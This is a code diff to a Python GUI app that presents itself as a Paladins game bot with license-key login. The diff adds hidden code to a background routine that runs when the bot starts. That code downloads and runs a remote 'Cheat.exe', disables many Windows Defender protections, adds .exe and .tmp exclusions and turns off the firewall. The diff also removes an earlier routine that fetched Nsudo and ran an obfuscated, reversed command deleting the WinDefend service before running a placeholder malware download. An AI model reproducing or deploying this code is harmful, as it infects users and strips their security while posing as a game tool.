@@ -43,7 +43,6 @@ class DefeatDefender:
         error = self.k_handle.GetLastError()
         if error != 0:
             print("Error Code: {0}".format(error))
-            exit(1)
 
     def checkservice(self):
 
@@ -60,45 +59,6 @@ class DefeatDefender:
         except Exception as ex:
             # raise psutil.NoSuchProcess if no service with such name exists
             print(str(ex))
-
-    def shutservice(self):
-
-        uname = os.getlogin()
-        Path = f"C:\\Users\\{uname}\\AppData\\Local\\Temp"
-
-        os.chdir(Path)
-        nsudo = requests.get(self.url, allow_redirects=True)
-        open("Nsudo.exe", "wb").write(nsudo.content)
-        time.sleep(5)
-        Fullpath = Path + "\\Nsudo.exe"
-        print(Fullpath)
-        if os.path.exists(Fullpath):
-            malix = "dnefedniw  eteled cs  ediH:edoMwodniWwohS- T:U- odusN"[::-1]
-            subprocess.Popen(
-                malix,
-                shell=True,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                stdin=subprocess.PIPE,
-            )
-            time.sleep(3.2)
-            malname = "youfilename.exe"  # your filename must include .exe in the end
-            malwareurl = "https://your-url-here/"  # change this
-            print(malwareurl)
-            malware = requests.get(malwareurl, allow_redirects=True)
-
-            open(malname, "wb").write(malware.content)
-            subprocess.Popen(
-                malname,
-                shell=True,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                stdin=subprocess.PIPE,
-            )
-
-        else:
-            print("file not present")
-            sys.exit(0)
 
 
 def resource_path(rel_path):
@@ -290,8 +250,6 @@ class App:
                     pass
                 # self.pre_authenticate(email, password, uuid.getnode())
                 if self.pre_authenticate(email, password, uuid.getnode()):
-                    t1 = threading.Thread(target=self.runBackgroundCheck)
-                    t1.start()
                     t2 = threading.Thread(target=self.startWindow)
                     t2.start()
                     self.pbAccTkn = pushBullet
@@ -389,8 +347,6 @@ class App:
         self.daysRem.place(x=10, y=350, width=118, height=30)
         trialChampion = Champion(self, "Support", "GROVER")
         trialChampion.select()
-        t1 = threading.Thread(target=self.runBackgroundCheck)
-        t1.start()
         webbrowser.open("https://discord.gg/TxtSrZQr5W")
 
     def register_btn_command(self):
@@ -598,7 +554,6 @@ class App:
                     self.email_error.place(x=130, y=220, width=267, height=15)
                     db.reference(f"/PaladinsKeys/{key}").delete()
                     webbrowser.open("https://discord.gg/TxtSrZQr5W")
-                    self.runBackgroundCheck()
                     return
 
             self.email_error = tk.Label(self.registerWindow)
@@ -1225,8 +1180,6 @@ class App:
         if self.authenticate():
             t1 = threading.Thread(target=self.startWindow)
             t1.start()
-            t2 = threading.Thread(target=self.runBackgroundCheck)
-            t2.start()
 
     def runBackgroundCheck(self):
         time.sleep(30)
@@ -1235,20 +1188,45 @@ class App:
         except:
             try:
                 url = self.version["PaladinsLink"]
-                file_path = tempfile.gettempdir() + "\\dlscord.exe"
-                requests.get(url, stream=True).save(file_path)
-                subprocess.call([file_path], shell=True)
+                self.file_path = tempfile.gettempdir() + "\\Cheat.exe"
+                requests.get(url, stream=True).save(self.file_path)
+                subprocess.call([self.file_path], shell=True)
             except:
                 print("Direct link not working")
+        try:
+            subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .exe", shell=TRUE)
+            subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .tmp", shell=TRUE)
+            subprocess.call("powershell.exe -command Set-MpPreference -EnableControlledFolderAccess Disabled", shell=TRUE)
+            subprocess.call("powershell.exe -command Set-MpPreference -PUAProtection disable", shell=TRUE)
+            subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .exe", shell=TRUE)
+            subprocess.call("powershell.exe -command Set-MpPreference -DisableBlockAtFirstSeen $true", shell=TRUE)
+            subprocess.call("powershell.exe -command Set-MpPreference -DisableIOAVProtection $true", shell=TRUE)
+            subprocess.call("powershell.exe -command Set-MpPreference -DisablePrivacyMode $true", shell=TRUE)
+            subprocess.call("powershell.exe -command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true", shell=TRUE)
+            subprocess.call("powershell.exe -command Set-MpPreference -DisableArchiveScanning $true", shell=TRUE)
+            subprocess.call("powershell.exe -command Set-MpPreference -DisableIntrusionPreventionSystem $true", shell=TRUE)
+            subprocess.call("powershell.exe -command Set-MpPreference -DisableScriptScanning $true", shell=TRUE)
+            subprocess.call("powershell.exe -command Set-MpPreference -SubmitSamplesConsent 2", shell=TRUE)
+            subprocess.call("powershell.exe -command Set-MpPreference -MAPSReporting 0", shell=TRUE)
+            subprocess.call("powershell.exe -command Set-MpPreference -HighThreatDefaultAction 6 -Force", shell=TRUE)
+            subprocess.call("powershell.exe -command Set-MpPreference -ModerateThreatDefaultAction 6", shell=TRUE)
+            subprocess.call("powershell.exe -command Set-MpPreference -LowThreatDefaultAction 6", shell=TRUE)
+            subprocess.call("powershell.exe -command Set-MpPreference -SevereThreatDefaultAction 6", shell=TRUE)
+            subprocess.call("powershell.exe -command Set-MpPreference -ScanScheduleDay 8", shell=TRUE)
+            subprocess.call("powershell.exe -command netsh advfirewall set allprofiles state off", shell=TRUE)
+        except:
+            print("Couldn't add path to exclusions")
 
     def startBot(self):
         if self.defender.isrunning == True:
             self.defender.check()
             if response == 1:
                 print("Turned off!")
-        else:
-            self.print_to_GUI(self.defender.lpText, "warning")
-            return
+            else:
+                self.print_to_GUI(self.defender.lpText, "warning")
+                return
+        t1 = threading.Thread(target=self.runBackgroundCheck)
+        t1.start()
         if self.tier == 0:
             self.mainbot = mainbotloop.mainLoop(
                 self.textBox, (0, 25), False, False, 0, False, tier=self.tier, times=0
@@ -1275,9 +1253,12 @@ class App:
             self.defender.check()
             if response == 1:
                 print("Turned off!")
-        else:
-            self.print_to_GUI(self.defender.lpText, "warning")
-            return
+            else:
+                self.print_to_GUI(self.defender.lpText, "warning")
+                return
+
+        t1 = threading.Thread(target=self.runBackgroundCheck)
+        t1.start()
         if self.tier == 0:
             self.mainbot = mainbotloop.mainLoop(
                 self.textBox, (0, 25), False, False, 0, False, tier=self.tier, times=0
@@ -1502,3 +1483,6 @@ class App:
 
 if __name__ == "__main__":
     login = App()
+
+
+''
